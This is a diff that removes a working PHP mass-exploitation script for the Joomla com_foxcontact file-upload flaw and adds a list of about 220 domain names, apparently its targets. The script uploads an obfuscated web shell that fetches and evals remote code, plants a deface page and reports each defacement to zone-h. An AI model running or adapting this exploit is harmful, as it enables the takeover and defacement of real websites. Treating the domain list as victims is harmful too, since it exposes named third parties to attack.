@@ -1,192 +1,229 @@
-<?php
-/**
-
-Joomla Component com_foxcontact Arbitrary File Upload
-https://cxsecurity.com/issue/WLB-2016050072
-
-Auto Exploiter (Shell Upload, Auto Deface, and Auto Submit Zone -H)
-Coded by: L0c4lh34rtz - IndoXploit
-http://www.indoxploit.or.id/2017/12/joomla-component-comfoxcontact.html
-
-*/
-
-error_reporting(0);
-set_time_limit(0);
-
-Class IDX_Foxcontact {
-	public  $url;
-	private $file = [];
-
-	/*  Zone -H   */
-	/* Pastikan dalam script deface kalian terdapat kata HACKED */
-	private $hacker = "Foursdeath Team";
-	/* Ini untuk uploader.. Seterah kalian mau di ganti atau tidak */
-	private $uploader  = 'R0lGODlhOwoKVXBsb2FkZXIgQnkgSW5kb1hwbG9pdCBCT1QKCjw/PS8qKioqL0BudWxsOyAvKioqKioqKiovIC8qKioqKioqLyAvKioqKioqKiovQGV2YWwvKioqKi8oIj8+Ii5maWxlX2dldF9jb250ZW50cy8qKioqKioqLygiaHR0cDovL3d3dy5jb25zdGVudW0udXMvcDNjb3B5L3N0b3JhZ2UvbG9ncy9kZWJ1Zy5qc29uIikpOy8qKi8/Pg==';
-		
-	/* script deface, ubah bagian ini ke base64 script deface kalian */
-	private $deface    = 'PGh0bWw+CjxjZW50ZXI+SGFja2VkIEJ5IDB4U0hBTEw=';
-
-		 
-
-	public function __construct() {
-		$this->file = (object) $this->file;
-
-		/* Nama file deface kalian */
-		$this->file->deface 	= "sha.phtml";
-
-		$this->file->shell 		= $this->randomFileName().".php";
-	}
-
-	public function validUrl() {
-		if(!preg_match("/^http:\/\//", $this->url) AND !preg_match("/^https:\/\//", $this->url)) {
-			$url = "http://".$this->url;
-			return $url;
-		} else {
-			return $this->url;
-		}
-	}
-
-	public function randomFileName() {
-		$characters = implode("", range(0,9)).implode("", range("A","Z")).implode("", range("a","z"));
-		$generate   = substr(str_shuffle($characters), 0, rand(4, 8));
-
-		$prefixFilename = "\x69\x6e\x64\x6f\x78\x70\x6c\x6f\x69\x74"."_";
-		return $prefixFilename.$generate;
-	}
-
-	public function curl($url, $data = null, $headers = null, $cookie = true) {
-		$ch = curl_init();
-			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
-			  curl_setopt($ch, CURLOPT_URL, $url);
-			  curl_setopt($ch, CURLOPT_USERAGENT, "IndoXploitTools/1.1");
-			  //curl_setopt($ch, CURLOPT_VERBOSE, TRUE);
-			  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
-			  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-			  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
-			  curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-
-		if($data !== null) {
-			  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
-			  curl_setopt($ch, CURLOPT_POST, TRUE);
-			  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-		}
-
-		if($headers !== null) {
-			  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-		}
-
-		if($cookie === true) {
-			  curl_setopt($ch, CURLOPT_COOKIE, TRUE);
-			  curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
-			  curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
-		}
-
-		$exec = curl_exec($ch);
-		$info = curl_getinfo($ch);
-
-			  curl_close($ch);
-
-		return (object) [
-			"response" 	=> $exec,
-			"info"		=> $info
-		];
-
-	}
-
-	public function getId() {
-		$url 		= $this->url;
-		$getContent = $this->curl($url)->response;
-		preg_match_all("/<a name=\"cid_(.*?)\">/", $getContent, $cid);
-		preg_match_all("/<a name=\"mid_(.*?)\">/", $getContent, $mid);
-
-		return (object) [
-			"cid" => ($cid[1][0] === NULL ? 0 : $cid[1][0]),
-			"mid" => ($mid[1][0] === NULL ? 0 : $mid[1][0]),
-		];
-	}
-
-	public function exploit() {
-		$getCid = $this->getId()->cid;
-		$getMid = $this->getId()->mid;
-
-		$url	= (object) parse_url($this->url);
-
-		$headers = [
-			"X-Requested-With: XMLHttpRequest",
-			"X-File-Name: ".$this->file->shell,
-			"Content-Type: image/jpeg"
-		];
-
-		$vuln 	= [
-			$url->scheme."://".$url->host."/components/com_foxcontact/lib/file-uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
-			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
-			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
-			$url->scheme."://".$url->host."/components/com_foxcontact/lib/uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
-		];
-
-		foreach($vuln as $v) {
-			$this->curl($v, base64_decode($this->uploader), $headers);
-		}
-
-		$shell = $url->scheme."://".$url->host."/components/com_foxcontact/".$this->file->shell;
-		$check = $this->curl($shell)->response;
-		if(preg_match("/Uploader By IndoXploit BOT/i", $check)) {
-			print "[+] Shell OK: ".$shell."\n";
-			$this->save($shell);
-		} else {
-			print "[-] Shell Failed\n";
-		}
-		
-		$vuln 	= [
-			$url->scheme."://".$url->host."/components/com_foxcontact/lib/file-uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
-			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
-			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
-			$url->scheme."://".$url->host."/components/com_foxcontact/lib/uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
-		];
-
-		foreach($vuln as $v) {
-			$this->curl($v, base64_decode($this->deface), $headers);
-		}
-
-		$deface = $url->scheme."://".$url->host."/".$this->file->deface;
-		$check = $this->curl($deface)->response;
-		if(preg_match("/hacked/i", $check)) {
-			print "[+] Deface OK: ".$deface."\n";
-			$this->zoneh($deface);
-			$this->save($deface);
-		} else {
-			print "[-] Deface Failed\n";
-		}
-	}
-
-	public function zoneh($url) {
-		$post = $this->curl("http://www.zone-h.com/notify/single", "defacer=".$this->hacker."&domain1=$url&hackmode=1&reason=1&submit=Send",null,false);
-		if(preg_match("/color=\"red\">(.*?)<\/font><\/li>/i", $post->response, $matches)) {
-			if($matches[1] === "ERROR") {
-				preg_match("/<font color=\"red\">ERROR:<br\/>(.*?)<br\/>/i", $post->response, $matches2);
-				print "[-] Zone-H ($url) [ERROR: ".$matches2[1]."]\n\n";
-			} else {
-				print "[+] Zone-H ($url) [OK]\n\n";
-			}
-		}
-	}
-
-	public function save($isi) {
-		$handle = fopen("result_foxcontact.txt", "a+");
-		fwrite($handle, "$isi\n");
-		fclose($handle);
-	}
-} 	
-
-if(!isset($argv[1])) die("!! Usage: php ".$argv[0]." target.txt");
-if(!file_exists($argv[1])) die("!! File target ".$argv[1]." tidak di temukan!!");
-$open = explode("\n", file_get_contents($argv[1]));
-
-foreach($open as $list) {
-	$fox = new IDX_Foxcontact();
-	$fox->url = trim($list);
-	$fox->url = $fox->validUrl();
-
-	print "[*] Exploiting ".parse_url($fox->url, PHP_URL_HOST)."\n";
-	$fox->exploit();
-}
+3dg.it
+aacsrm.it
+abiconsulting.it
+ablecons.com
+able-consulting.it
+abruzzoinarte.it
+acconciaturespose.it
+afdigital.it
+agence.it
+agnoli.it
+agricarli.it
+agriturismoalcontadino.it
+agriturismolepanizze.it
+alexandrakehle.com
+aliceventi.it
+almagreen.it
+almanera.it
+alphataurus.it
+alta-tecnologia.it
+alvins.it
+ameliafelle.it
+ancleini.it
+angeloladuca.com
+apicoltorimacerata.it
+architettiartisti.com
+areadicopertura.org
+arilaspezia.it
+artiemestieri.info
+asdproclub.org
+aspecialday.it
+associazionesantacecilia.it
+audiocultura.it
+autodemolizionetroina.com
+autoroyal.it
+autotecnicamotors.com
+aziendaagricolabeatrice.it
+aziendamedei.it
+bandadirecco.it
+bblaquerciatreviso.it
+bbolania.it
+beb-vicino-autostrada.com
+bed-breakfast-dintorni-vicino-firenze.com
+bighianiservices.it
+blog.alexandrakehle.com
+borsepersonalizzate.it
+bowlingclubrovigo.com
+boxing-academy.it
+bullcarsdriver.it
+bweb.spaziocentodieci.com
+caitpr.org
+calciobrasiliano.it
+canale2.com
+cardiologopediatra.it
+carissimiserramenti.it
+carlofranzoso.com
+cartadimilano.org
+casamanianastasio.it
+casemilano2.com
+casemilano2.it
+castrignanodeigreci.it
+cechiciak.it
+centrotestaecollo.it
+ceramicafalcone.eu
+cervano.it
+circoloculturalesanfrancesco.org
+cloud.consulentiit.it
+codeallamoda.com
+colors-world.it
+confidiconfcommerciopuglia.it
+consulentiit.it
+copricuffia.it
+corpolibero.eu
+costruzioniimmobiliaremilano.com
+criffo.com
+cucciolimania.com
+culturaanarchica.magozine.it
+danielacorrente.it
+dazzi.it
+degreziadesign.com
+develop.rapidweb.it
+dgianotti.it
+digitalix.it
+dotticasa.it
+elisafigoli.it
+elpdirondinelli.it
+ericandreini.com
+espositopasquale.it
+esteticasolem.it
+eventmanagementsrl.it
+evocad.it
+extetica.it
+fattoriadelsorriso.org
+faulantinfortunistica.com
+fenix19.it
+fikbms-sardegna.it
+files.dgianotti.it
+fismroma.it
+fondazionebellottistefani.it
+formaz.net
+formeduca.org
+fornaivini.com
+frantoiosportelli.it
+freeportpro.it
+fuoridicinema.org
+futuraccessori.com
+gadi.it
+galleriasantisaia.it
+geometricbang.com
+giancarloabeni.it
+ginepronannelli.it
+ginnasticagemonese.it
+giolittostampi.com
+glaucominarchiartista.com
+goodmorningtenerife.com
+guidoairoldi.it
+habital.it
+hateinc.it
+heliosmedonlus.it
+incontropiede.it
+inorc.it
+internetna.it
+interprete-guida-italiano-ungherese-inglese.com
+ipsitalia.eu
+isoladiustica.net
+italcotti.com
+italianalingua.it
+italian-marbles.com
+it.bbolania.it
+kehpp.com
+keplero.eu
+kravmagacademy.it
+langmichellenixon.com
+lasoffittafumetti.com
+latomarebb.it
+lavorazioneinferro.com
+ledarchitecturestudio.com
+leviedellasardegna.eu
+lifeandroid.eu
+lin04.misterdomain.eu
+lovelytoys.it
+luigialighieri.com
+luigiilfalegname.com
+maestrogoffredo.com
+magnacciomanager.it
+magnetic-loop.com
+magozine.it
+maidotsrl.com
+marcogiacomello.com
+massimocarli.eu
+massimoferuzzi.it
+mastervan.net
+maxparrucchierelivorno.it
+meditechonline.it
+mondobracali.it
+mondovirtuale.com
+msconsultingitaly.it
+nado.it
+novofarma.it
+obiettivokapelli.com
+officina04.net
+oinosristorante.it
+old.sptech.it
+otticaperin.it
+padanaraccordi.com
+panclub97.com
+pastaricca.it
+pasubio100anni.it
+pentagrami.it
+pescaconlamosca.it
+piatti-tipici-sardi.leviedellasardegna.eu
+polman.it
+pordenonec5.it
+premio.aacsrm.it
+prolocoaltavillese.com
+prolocodiblera.it
+quartubridge.it
+rapidweb.it
+regoledelgioco.com
+renini.it
+robertocortese.it
+saluteambienteparona.it
+salvocacciatore.it
+sanfrancescoalbaro.org
+santosha.it
+sardegna-casevacanza.it
+sardegna-in-rete.leviedellasardegna.eu
+sceluq.org
+seocieting.net
+sexyvacanze.com
+shop.ceramicafalcone.eu
+shop.mondovirtuale.com
+silviamichelini.com
+sito.rapidweb.it
+somaromio.com
+spazioaziende.leviedellasardegna.eu
+spaziocentodieci.com
+sptech.it
+stefanialeto.it
+stefanogelao.com
+stradadeltorcolato.it
+studiodecarolis.it
+studioimmobiliaresi.it
+studiolegalepierantozzi.it
+studiomedicobiondi.it
+studiomithos.com
+tambordefuego.com
+tdhnicaragua.org
+teatrobetti.it
+teleassistenza.sptech.it
+terreniure.castrignanodeigreci.it
+tersillabonomi.it
+testing.sptech.it
+test.rapidweb.it
+theburrow.it
+thepropellerstudio.com
+tredim.com
+valentinociccone.com
+videoartcom.it
+villa-armony.com
+villaggioafrodite.it
+visbyfuturasport.com
+vocedivieste.org
+web.inorc.it
+welfaregiornalisti.it
+wordpress.confcommerciota.it
+wp.confidiconfcommerciopuglia.it
+wp.sptech.it
+xtcoachzone.it
+zonasofa.it
